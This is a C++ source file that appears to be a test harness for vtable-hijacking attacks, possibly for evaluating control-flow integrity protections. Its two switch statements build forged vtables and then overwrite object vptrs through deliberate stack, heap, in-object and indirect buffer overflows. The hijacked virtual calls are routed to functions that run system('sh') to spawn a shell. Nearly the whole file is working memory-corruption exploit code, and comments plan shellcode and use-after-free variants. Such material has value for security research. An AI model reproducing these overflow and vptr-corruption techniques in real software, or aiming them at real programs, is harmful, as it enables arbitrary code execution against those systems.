#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <inttypes.h>
#include <malloc.h>
#include <iostream>

using namespace std;

void* destination = NULL;
char* attackString = "sh";


class ParentOne
{
    public:
        void* buffer[3];
        virtual void doSomething1(char *string){
            cout << "ParentOne F1" << endl;

        }
        virtual void doSomething2(char *string){
            cout << "ParentOne F2" << endl;
        }
};

class ParentTwo
{
    public:
        
        virtual void foo1(char *string){
            cout << "ParentTwo F1" << endl;
        }
        virtual void foo2(char *string)
        {
            cout << "ParentTwo F2" << endl;
        }
};


class SingleInherit1:public ParentOne
{
    public:
        virtual void doSomething1(char *string)
        {
            cout << "SingleInherit1 F1" << endl;
        }
        virtual void doSomething2(char *string){
            cout << "SingleInherit1 F2" << endl;
        }

};
class SingleInherit2:public ParentOne
{
    public:
        virtual void doSomething1(char *string)
        {
            cout << "SingleInherit2 F1" << endl;
        }
        virtual void doSomething2(char *string){
            cout << "SingleInherit2 F2" << endl;
        }

};

class DoubleInheritParent:public ParentOne, public ParentTwo
{
    public:
        virtual void doSomething1(char *string)
        {
            cout << "DoubleInherit1!!!\nInput string: \"" << string << "\"" << endl;
        }
        virtual void doSomething2(char *string){

        }

        virtual void foo1(char *string){
            //do syscall
        }
        virtual void foo2(char *string)
        {
            //do syscall
        }
        void indirectOverwrite() {
            void** writeTo;
            void* writeThis;
            void* _buffer[3];
            
            // todo could be infinite
            for (int i = 0; ; ++i)  // overflow the destination+source
            {
                *(_buffer + i) = (void*)destination;
                if ((void*)(_buffer + i) == (void*)&writeTo)
                {
                    uint64_t vPTRlocation = *(uint64_t*)this;
                    vPTRlocation += sizeof(void*)*4;

                    *(_buffer + i) = (void*)vPTRlocation;
                    break;
                }
            }

            *writeTo = writeThis; 
        }


};
class DoubleInheritChild1:public DoubleInheritParent
{
    public:
};

class DoubleInheritChild2:public DoubleInheritParent
{
    public:

};



void doSyscall(int x, char* string) {
    cout << "calling system with args: " << string << endl;
    system(string);
}


int main(int argc, char const *argv[])
{
    if (argc != 3)
    {
        cout << "not enough params\n";
        exit(0);
    }

    cout << argv[0] <<" "<<argv[1] <<" "<<argv[2] << endl;    

    switch (atoi(argv[1])) {  //todo fix

        case 0:  // start of good vable point to good inheritance func: 
        {
            // P1 obj of SI1 points to SI2
            ParentOne* object2 = new SingleInherit2();
            void* vtableO2 = (void*)*(void**)object2;
            destination = vtableO2;
            delete object2;
            break;
        }


        case 1:  // middle of good vable point to good inheritance func: 
        {
            // P1 obj of SI1 points to SI2 func 2

            ParentOne* object2 = new SingleInherit2();
            void* vtableO2 = (void*)*(void**)object2;
            destination = (void*)((uint64_t)vtableO2 + sizeof(void*));
            
            delete object2;
            break;
        }

        case 2:  // start of good vable point to bad inheritance func:
        {
            // P1 obj of SI1 points to P2
            ParentTwo* object2 = new ParentTwo();
            void* vtableO2 = (void*)*(void**)object2;
            destination = vtableO2;
            
            delete object2;
            break;
        }

        case 3:  // middle of good vable point to bad inheritance func:
        {
            // P1 obj of SI1 points to P2 func 2
            ParentTwo* object2 = new ParentTwo();
            void* vtableO2 = (void*)*(void**)object2;
            destination = (void*)((uint64_t)vtableO2 + sizeof(void*));
            
            delete object2;
            break;
        }

        case 4:  // crafted vable point to good inheritance func:
        {
            // make a buffer and use it as a vtable point to SI2
            void** buffer = (void**)malloc (sizeof(void*) * 8);  // make it longer than necessary
            ParentOne* object2 = new SingleInherit2();
            void* vtableO2 = (void*)*(void**)object2;

            for (int i = 0; i < 8; ++i)
            {
                *(buffer+i) = *(((void**)vtableO2)+1);  // second function
            }

            destination = buffer;
            
            delete object2;
            break;
        }

        case 5:  // crafted vable point to bad inheritance func:
        {
            // make a buffer and use it as a vtable point to P2
            void** buffer = (void**)malloc (sizeof(void*) * 8);  // make it longer than necessary
            ParentTwo* object2 = new ParentTwo();
            void* vtableO2 = (void*)*(void**)object2;

            for (int i = 0; i < 8; ++i)
            {
                *(buffer+i) = *(((void**)vtableO2)+1);  // second function
            }

            destination = buffer;
            
            delete object2;
            break;
        }

        case 6:  // crafted vable nonClassFunc:
        {
            // make a buffer and use it as a vtable point to doSyscall
            void** buffer = (void**)malloc (sizeof(void*) * 8);  // make it longer than necessary

            for (int i = 0; i < 8; ++i)
            {
               *(buffer+i) = (void*)&doSyscall;  // second function
            }

            destination = buffer;
            break;
        }


        case 7:  // crafted vable middle of nonClassFunc:
        {
            // make a buffer and use it as a vtable point to syslbl
            void** buffer = (void**)malloc (sizeof(void*) * 8);  // make it longer than necessary

            for (int i = 0; i < 8; ++i)
            {
                *(buffer+i) = &&syslbl;  // second function
            }

            destination = buffer;
            break;
        }
        // todo shellcode
        // todo existing code double reference

        // more options for double inherit**************************************************8
        // e.g. start of first vtable
        default: {
            cout << "bad first option\n";
            exit(0);
            break;
        }
    }


    switch (atoi(argv[2])) {  //todo fix
        case 0:  //stack+SingleInherit+sequentialOverFlow:
        {
            SingleInherit1 singleObj;
            void* buffer[3];

            ParentOne* object = &singleObj;

            if (((void*)object < (void*)buffer))
            {
                cout << "cant overflow...object before buffer" << endl;
                printf("object = %p\tbuffer = %p\n", object, buffer);
                exit(0);
            }

            printf("old vpointer = %p\n", (void*)*(void**)object);
            // printf("address of buffer = %p \naddress of object = %p\n\n", &buffer[0], &singleObj);
            for (int i = 0; i<((uint64_t)object - (uint64_t)buffer); ++i)  // overflow
            {
                *(buffer + i) = (void*)destination;
                if ((void*)(buffer + i) == (void*)object)
                    break;
            }

            printf("new vpointer = %p\n", (void*)*(void**)object);
            printf("vpointer to copy = %p\n", destination);

            cout << "calling SingleInherit1::F1" << endl;
            object->doSomething1(attackString);
            break;
        }

        case 1:  // heap+SingleInherit+sequentialOverFlow:
        {
            // void** buffer = (void **)malloc(sizeof(void*)*3);
            void** buffer = new void*[3];
            ParentOne* object = new SingleInherit1();

            if (((void*)object < (void*)buffer))
            {
                cout << "cant overflow...object before buffer" << endl;
                printf("object = %p\tbuffer = %p\n", object, buffer);
                exit(0);
            }

            printf("old vpointer = %p\n", (void*)*(void**)object);

            for (int i = 0;i<((uint64_t)object - (uint64_t)buffer) ; ++i)  // overflow
            {
                // cout << ((uint64_t)object - (uint64_t)buffer)<< "   "<<i << endl;
                *(buffer + i) = (void*)destination;
                if ((void*)(buffer + i) == (void*)object)
                    break;
            }
            printf("new vpointer = %p\n", (void*)*(void**)object);
            printf("vpointer to copy = %p\n", destination);


            cout << "calling SingleInherit1::F1" << endl;
            object->doSomething1(attackString);

            break;
        }

        case 2:  // stack+SingleInherit+indirectOverwrite:
        {
            SingleInherit1 singleObj;

            // void** writeTo;
            // void* writeThis;
            // void* buffer[3];
            
            ParentOne* object = &singleObj;

            // if (((void*)writeTo < (void*)buffer))
            // {
            //     cout << "cant overflow...object before buffer" << endl;
            //     printf("object = %p\tbuffer = %p\n", object, buffer);
            //     exit(0);
            // }

            // // todo could be infinite
            // for (int i = 0; ; ++i)  // overflow the destination+source
            // {
            //     *(buffer + i) = (void*)destination;
            //     if ((void*)(buffer + i) == (void*)&writeTo)
            //     {
            //         *(buffer + i) = (void*)object;
            //         break;
            //     }
            // }

            // *writeTo = writeThis; 
            printf("old vpointer = %p\n", (void*)*(void**)object);

            *(void**)object = destination;

            printf("new vpointer = %p\n", (void*)*(void**)object);
            printf("vpointer to copy = %p\n", destination);
            cout << "calling SingleInherit1::F1" << endl;
            object->doSomething1(attackString);
            break;
        }

        case 3:  // heap+SingleInherit+indirectOverwrite:
        {
            ParentOne* object = new SingleInherit1();

            // void** writeTo;
            // void* writeThis;
            // void* buffer[3];

            // if (((void*)writeTo < (void*)buffer))
            // {
            //     cout << "cant overflow...object before buffer" << endl;
            //     printf("object = %p\tbuffer = %p\n", object, buffer);
            //     exit(0);
            // }

            // // todo could be infinite
            // for (int i = 0; ; ++i)  // overflow the destination+source
            // {
            //     *(buffer + i) = (void*)destination;
            //     if ((void*)(buffer + i) == (void*)&writeTo)
            //     {
            //         *(buffer + i) = (void*)object;
            //         break;
            //     }
            // }

            // *writeTo = writeThis; 
            printf("old vpointer = %p\n", (void*)*(void**)object);

            *(void**)object = destination;
            
            printf("new vpointer = %p\n", (void*)*(void**)object);
            printf("vpointer to copy = %p\n", destination);
            
            cout << "calling SingleInherit1::F1" << endl;
            object->doSomething1(attackString);
            break;
        }

//////////////////////////double
        case 4:  // stack+DoubleInherit+withinObjectOverFlow:
        {
            DoubleInheritChild1 doubleObj;

            DoubleInheritParent* object = &doubleObj;

            for (int i = 0; i < 4; ++i)  // overflow assume that vptr is directly after
            {
                *(object->buffer + i) = (void*)destination;
            }

            object->foo1(attackString);
            break;
        }

        case 5:  // heap+DoubleInherit+withinObjectOverFlow:
        {
            DoubleInheritParent* object = new DoubleInheritChild1();

            for (int i = 0; i < 4; ++i)  // overflow assume that vptr is directly after
            {
                *(object->buffer + i) = (void*)destination;
            }

            object->foo1(attackString);
            break;
        }

        case 6:  // stack+DoubleInherit+INdirectOverwrite:
        {
            DoubleInheritChild1 doubleObj;

            DoubleInheritParent* object = &doubleObj;

            object->indirectOverwrite();

            object->doSomething1(attackString);
            break;
        }

        case 7:  // heap+DoubleInherit+INdirectOverwrite:
        {

            DoubleInheritParent* object = new DoubleInheritChild1();

            object->indirectOverwrite();

            object->doSomething1(attackString);
            break;
        }

        default: {
            cout << "bad second option\n";
            exit(0);
            break;
        }
    }



    return 0;

syslbl:
    system(attackString);



 //    ******************uaf
	// Child1* c1 = new Child1();

	// c1 -> doSomething("sh");

	// free(c1);

	// new Child2();

	// c1 -> doSomething("sh");
}


















